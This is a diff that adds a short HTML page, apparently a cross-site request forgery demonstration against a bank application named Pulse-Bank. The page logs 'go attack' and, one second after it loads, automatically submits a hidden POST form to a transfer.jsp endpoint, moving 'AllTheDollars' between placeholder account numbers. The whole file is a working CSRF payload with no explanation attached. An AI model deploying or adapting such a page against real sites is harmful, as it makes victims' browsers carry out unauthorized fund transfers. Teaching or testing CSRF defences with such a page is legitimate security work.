@@ -1,0 +1,15 @@
+<html>
+  <script>
+      console.log("go attack");
+  </script>
+
+  <body onload="setTimeout(function() { document.frm1.submit() }, 1000)">
+
+    <form action="https://Pulse-Bank.com:5000/transfer.jsp" method="POST" name="frm1">
+      <input type="hidden" name="FromAccount" value="000-00000-0000-00" />
+      <input type="hidden" name="ToAccount" value="111-11111-1111-11" />
+      <input type="hidden" name="Amount" value="AllTheDollars" />
+    </form>
+
+  </body>
+</html>
